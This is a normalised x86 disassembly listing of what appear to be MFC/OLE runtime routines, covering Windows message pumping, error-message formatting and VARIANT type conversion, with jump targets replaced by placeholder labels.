push [ esp + 0x8 ]
mov ecx [ eax ]
push [ esp + 0x8 ]
push eax
call [ ecx ]
jmp r-xdata
retn 0x8
sub_42852f
mov eax sub_42b549
call sub_410a78
push ecx
push esi
push 0xc
call sub_4221b9
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_423042
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
jmp r-xdata
push ebx
lea eax [ ebp + 0x10 ]
push ebx
push eax
push 0x800
push [ ecx + 0x8 ]
push ebx
push 0x1100
call [ FormatMessageA@IAT ]
test eax eax
jne r-xdata
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
mov [ ebp + 0x8 ] esi
call sub_410a97
pop esi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x10 ]
call [ LocalFree@IAT ]
push 0x1
pop eax
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4285d7
push ebp
mov ebp esp
mov eax 0x110
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax 0x111
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_41e62d
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x63
jne r-xdata
pop ebp
retn 0x10
push 0x0
push 0xe146
push eax
push [ ebp + 0x8 ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
sub_428658
push esi
push edi
push [ esp + 0x18 ]
mov esi ecx
call sub_428622
lea edi [ esi + 0x60 ]
push 0x2c
push 0x0
push edi
mov [ esi ] r--data
call sub_410a20
mov eax [ esp + 0x20 ]
add esp 0xc
cmp [ esp + 0x10 ] 0x0
mov [ edi ] 0x2c
mov [ esi + 0x64 ] eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esi + 0x70 ] sub_4285d7
mov [ esi + 0x84 ] eax
mov eax esi
pop edi
pop esi
retn 0x10
or al 0x8
mov [ esi + 0x64 ] eax
sub_4286d3
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_4259b7
push esi
mov [ esi + 0x68 ] eax
call sub_41f89a
lea eax [ esi + 0x60 ]
push eax
call Ordinal_oledlg_8
mov edi eax
call sub_41f8e6
mov ecx esi
call sub_41f465
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ eax + 0x1c ]
push 0x2
pop eax
cmp edi eax
je r-xdata
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
pop edi
pop esi
leave
retn
cmp edi 0x75
jne r-xdata
cmp edi 0x76
je r-xdata
mov [ esi + 0x8c ] 0x1
jmp r-xdata
mov [ esi + 0x8c ] eax
cmp edi 0x77
jne r-xdata
push 0x1
pop eax
push edi
mov ecx esi
call sub_42863a
mov [ esi + 0x8c ] 0x3
jmp r-xdata
sub_428763
push esi
mov esi ecx
call sub_421ce9
mov eax [ esp + 0x8 ]
mov [ esi + 0x34 ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x10 ]
and [ esi + 0x20 ] 0x0
and [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x24 ] eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x30 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x10
sub_4287be
mov eax sub_42b44c
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x20 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
call sub_42837c
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push [ esi + 0x24 ]
call sub_4221e2
pop ecx
sub_42880c
push esi
mov esi ecx
mov ecx [ esi + 0x28 ]
cmp ecx [ esi + 0x2c ]
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
imul eax ecx
add eax [ esi + 0x24 ]
push eax
push [ esp + 0x10 ]
call sub_410ff0
add esp 0xc
inc [ esi + 0x28 ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop esi
retn 0x4
sub_428859
mov eax sub_42b461
call sub_410a78
push ecx
push esi
mov esi ecx
push 0x38
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ esi + 0x28 ]
pop esi
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push eax
push [ esi + 0x2c ]
push [ esi + 0x24 ]
push [ esi + 0x1c ]
call sub_428763
sub_4288d4
mov eax sub_42b46c
call sub_410a78
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0x34 ]
mov eax [ ebp + 0x14 ]
test eax eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0x10 ] 0x8000ffff
and [ eax ] 0x0
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x50 ]
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub ebx [ ebp + 0x8 ]
mov [ eax ] ebx
add esi [ edi + 0x1c ]
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_42895c
mov eax sub_42b478
call sub_410a78
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
lea esi [ eax - 0x34 ]
mov eax [ ebp + 0xc ]
push edi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp + 0x8 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn 0x8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
test eax eax
je r-xdata
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4289cc
mov eax sub_42b484
call sub_410a78
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax - 0x34 ]
and [ ebx ] 0x0
push edi
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] 0x8000ffff
call [ eax + 0x5c ]
mov edi eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov [ edi + 0x20 ] esi
mov [ edi + 0x20 ] eax
jmp r-xdata
mov eax [ edi + 0x20 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
add edi 0x34
and [ ebp + 0x8 ] 0x0
mov [ ebx ] edi
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_428a54
push esi
push sub_428a8f
mov ecx rw-data
call sub_427941
mov esi eax
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
pop esi
retn
push r--data
call sub_4283b9
push eax
call [ OleIsCurrentClipboard@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
pop esi
retn
and [ esi + 0x8 ] 0x0
sub_428a8f
mov eax sub_42b5a1
call sub_410a78
push ecx
push 0x14
call sub_42747a
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_4282f6
sub_428ad0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ PeekMessageA@IAT ]
push 0x3
xor ebx ebx
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push ebx
push eax
call esi
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn 0x4
push 0x1
pop ebx
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x3
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
jne r-xdata
sub_428b18
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi r--data
add esi 0x4
cmp esi r--data
jb r-xdata
cmp [ ebp - 0x18 ] 0x100
je r-xdata
mov eax [ esi ]
push 0x2
push eax
push eax
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
shr eax 0x10
test ah 0x40
je r-xdata
cmp [ ebp - 0x18 ] 0x104
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn 0x4
sub_428b6e
mov eax sub_42b573
call sub_410a78
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_428658
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_4286d3
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_4286c8
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_428be9
mov eax sub_42b58b
call sub_410a78
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_428658
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_4286d3
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_4286c8
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_428ca0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ eax - 0x1c ] edi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x1
push esi
je r-xdata
mov eax [ eax - 0x8 ]
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov esi 0x36a
push edi
push esi
push esi
lea eax [ ebp - 0x1c ]
push edi
push eax
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
pop esi
jmp r-xdata
push edi
push edi
push esi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
pop edi
leave
retn 0x14
sub_428d02
mov eax [ esp + 0x4 ]
cmp [ esp + 0x10 ] 0x1
push esi
lea esi [ eax - 0x3c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax [ esi + 0x30 ]
jbe r-xdata
pop esi
retn 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x60 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x2
jne r-xdata
sub_428d45
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x3c ]
mov eax [ ebp + 0x10 ]
cmp eax [ edi + 0x38 ]
jbe r-xdata
xor esi esi
xor esi esi
cmp [ edi + 0x2c ] esi
jne r-xdata
push 0x2
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
push 0x2
jmp r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x5c ]
test eax eax
je r-xdata
push 0x1
mov eax [ edi ]
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx edi
call [ eax + 0x58 ]
pop eax
cmp [ edi + 0x2c ] esi
je r-xdata
cmp [ edi + 0x28 ] esi
je r-xdata
push ebx
push 0x3
mov ebx 0x200
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push esi
mov esi [ PeekMessageA@IAT ]
mov [ edi + 0x2c ] 0x1
push eax
push 0x108
mov ebx 0x100
push 0x209
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
mov eax [ edi ]
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0x64 ]
and [ edi + 0x2c ] 0x0
push 0x1
pop eax
pop ebx
jmp r-xdata
push 0x3
push 0x108
jmp r-xdata
call esi
test eax eax
push 0x3
je r-xdata
pop edi
pop esi
leave
retn 0x10
push ebx
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
sub_428e1a
push ecx
push ebx
push ebp
push esi
mov esi ecx
xor ebp ebp
push edi
mov eax [ esi ]
push ebp
mov edi [ MultiByteToWideChar@IAT ]
push ebp
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
push eax
push ebp
mov [ esp + 0x18 ] eax
call [ SysAllocStringLen@IAT ]
mov ebx eax
cmp ebx ebp
jne r-xdata
push [ esp + 0x10 ]
mov eax [ esi ]
push ebx
push [ eax - 0x8 ]
push eax
push ebp
push ebp
call edi
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
call sub_41dc26
sub_428e63
movzx eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax * 4 + r--data ]
mov cl [ edx ]
add eax 0x4
test cl cl
je r-xdata
retn 0x8
push esi
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
test cl 0x40
mov esi r--data
jne r-xdata
cmp cl 0xff
je r-xdata
pop esi
movzx ecx cl
and ecx 0xffffffbf
add eax [ esi + ecx * 4 ]
mov esi r--data
sub_428ea6
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x4
pop ebx
mov [ edi ] ecx
add edi ebx
cmp [ ebp + 0x14 ] 0x6
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
add edi ebx
cmp [ ebp + 0x14 ] 0xc
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x14 ]
movzx cx [ eax ]
mov eax 0xff
mov [ ebp + 0x8 ] ecx
cmp cx ax
je r-xdata
mov edx [ ebp + 0x18 ]
and [ ebp - 0x8 ] 0x0
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x8 ]
mov [ ebp + 0x14 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
mov eax 0x8002000e
mov esi [ ebp - 0x4 ]
cmp [ ebp + 0x14 ] esi
jl r-xdata
test cl 0x40
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
mov [ ecx ] eax
mov eax 0x8002000f
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp cx ax
jne r-xdata
cmp cx ax
je r-xdata
and ecx 0xffbf
or ch 0x40
mov [ ebp + 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ edx + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x14 ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0xc ]
shl eax 0x4
add esi eax
cmp cx 0xc
je r-xdata
cmp cx 0xc
jne r-xdata
inc [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
jmp r-xdata
movzx eax cx
cmp eax 0x11
jg r-xdata
mov dx [ esi ]
cmp cx dx
je r-xdata
mov [ rw-data ] 0xa
mov [ rw-data ] 0x80020004
mov esi rw-data
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
add eax 0xffffbffe
cmp eax 0x10
ja r-xdata
je r-xdata
mov edx [ ebp + 0x18 ]
mov ebx [ ebp + 0x20 ]
mov [ ebp + 0xc ] 0x8
add ebx eax
cmp cx 0xe
je r-xdata
jmp [ eax * 4 + jump_table_4290e1 ]
movzx eax [ esi + 0x8 ]
jmp r-xdata
add eax 0xfffffffe
cmp eax 0xb
ja r-xdata
cmp dx [ ebp + 0xc ]
je r-xdata
mov [ ebp + 0xc ] ecx
mov eax [ esi + 0x8 ]
mov [ edi ] eax
jmp [ eax * 4 + jump_table_4290b1 ]
cmp cx 0xe
jne r-xdata
push [ ebp + 0xc ]
push 0x0
push esi
push ebx
call [ VariantChangeType@IAT ]
test eax eax
jl r-xdata
movsx eax [ esi + 0x8 ]
jmp r-xdata
fld [ esi + 0x8 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ edi ] eax
mov eax [ esi + 0xc ]
mov [ edi + 0x4 ] eax
xor eax eax
cmp [ esi + 0x8 ] ax
setne al
jmp r-xdata
mov [ edi ] esi
jmp r-xdata
push 0x4
mov esi ebx
pop ebx
mov ax [ esi ]
cmp ax [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edi 0x8
jmp r-xdata
add edi ebx
push [ esi + 0x8 ]
call sub_428220
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
mov esi [ ebx + 0x8 ]
push esi
call sub_428220
push esi
mov [ ebx + 0x8 ] eax
call [ SysFreeString@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] 0x8
mov ecx [ ebp + 0x8 ]
sub_429125
mov eax sub_42b3c8
call sub_410a78
sub esp 0x2c
and [ ebp - 0x11 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x20 ] ecx
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x10 ] esp
test eax eax
mov [ ebp + 0x8 ] eax
jne r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
test [ ebp + 0xc ] 0xc
mov esi eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x1c ] eax
mov ax [ ebx + 0xc ]
mov [ ebp - 0x18 ] ax
je r-xdata
lea eax [ ebp - 0x11 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ eax + 0x8 ]
shl esi 0x4
mov eax esi
add eax 0x3
and al 0xfc
call sub_411530
mov ebx esp
test ebx ebx
mov [ ebp + 0xc ] ebx
je r-xdata
lea eax [ esi + 0x3 ]
add eax 0x3
and al 0xfc
call sub_411530
mov edi esp
push esi
push [ ebp + 0x8 ]
push edi
call sub_410ff0
mov ax [ ebx + 0xc ]
add esp 0xc
cmp ax 0x8
mov [ ebp + 0x8 ] edi
jne r-xdata
mov eax 0x8007000e
jmp r-xdata
push esi
push 0x0
push ebx
call sub_410a20
add esp 0xc
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_428e63
mov esi eax
lea eax [ esi + 0x10 ]
add eax 0x3
and al 0xfc
call sub_411530
mov edi esp
test edi edi
jne r-xdata
or [ edi + esi ] 0xff
inc esi
mov [ edi + esi ] al
and [ edi + esi + 0x1 ] 0x0
mov eax [ ebx + 0x14 ]
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] eax
push 0xe
pop eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x34 ]
push [ ebp + 0x14 ]
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
push edi
call sub_428ea6
xor ebx ebx
mov [ ebp + 0x18 ] eax
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
movzx eax [ ebp - 0x18 ]
and [ ebp - 0x4 ] ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp + 0xc ] eax
push esi
push edi
push [ ebp - 0x1c ]
call sub_429c87
fstp [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call [ VariantClear@IAT ]
add [ ebp + 0xc ] 0x10
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push esi
push edi
push [ ebp - 0x1c ]
call sub_429c87
fst [ ebp - 0x24 ]
jmp r-xdata
dec eax
push esi
push edi
dec eax
push [ ebp - 0x1c ]
je r-xdata
movzx eax [ ebp - 0x18 ]
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] cx
movzx ecx cx
add ecx 0xfffffffe
cmp ecx 0x10
ja r-xdata
fstp [ ebp - 0x34 ]
jmp r-xdata
call sub_429c87
fst [ ebp - 0x24 ]
call sub_429c87
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
dec eax
je r-xdata
xor eax eax
jmp [ ecx * 4 + jump_table_429389 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
call [ SysFreeString@IAT ]
test ebx ebx
je r-xdata
sub eax 0x3
je r-xdata
mov [ eax + 0x8 ] bl
jmp r-xdata
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0xc ] ecx
jmp r-xdata
fld [ ebp - 0x34 ]
fstp [ eax + 0x8 ]
jmp r-xdata
neg ebx
sbb ebx ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
lea esi [ ebp - 0x34 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebx ]
push ebx
call [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_4292dc
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
push 0x0
push 0x0
call sub_410a97
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
xor eax eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x8 ]
jb r-xdata
sub_4293cd
mov eax sub_42b3f2
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x2
call sub_422478
lea ecx [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_422478
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_422478
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_429434
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
push edi
xor esi esi
push 0x20
push esi
push [ ebp + 0x8 ]
call sub_410a20
mov ecx [ ebp + 0xc ]
add esp 0xc
lea eax [ ebp - 0x110 ]
push r--data
mov [ ebp - 0xc ] eax
call sub_422fb1
mov edi [ lstrlenA@IAT ]
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
push r--data
call sub_422fb1
test eax eax
lea eax [ ebp - 0x110 ]
push 0x100
push eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
mov dx [ eax + 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
mov edx [ eax + 0x10 ]
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x1c ]
mov [ ecx + 0x1c ] edx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
cmp [ ecx - 0x8 ] esi
je r-xdata
push 0xf108
call sub_42391b
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf108
push 0xf10a
call sub_42391b
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf10a
jmp r-xdata
mov eax [ eax + 0x18 ]
mov [ ebp + 0xc ] eax
cmp [ eax - 0x8 ] esi
je r-xdata
cmp ecx esi
jne r-xdata
push [ ebp - 0xc ]
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
push eax
push 0xffffffff
push [ ebp - 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp + 0xc ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] esi
jne r-xdata
cmp eax esi
jne r-xdata
push ecx
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp - 0x10 ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
call sub_4272f7
mov eax [ eax + 0x10 ]
cmp eax esi
mov [ ebp + 0xc ] eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] eax
jne r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0xc ]
lea esp [ ebp - 0x11c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx + 0x10 ] esi
je r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
cmp eax esi
mov [ ebp + 0xc ] eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
push esi
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
push eax
call edi
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and al 0xfc
call sub_411530
mov eax esp
push edi
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ eax ] si
push esi
push esi
call ebx
mov esi [ ebp - 0x8 ]
sub_429670
mov eax sub_42b425
call sub_410a78
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_423042
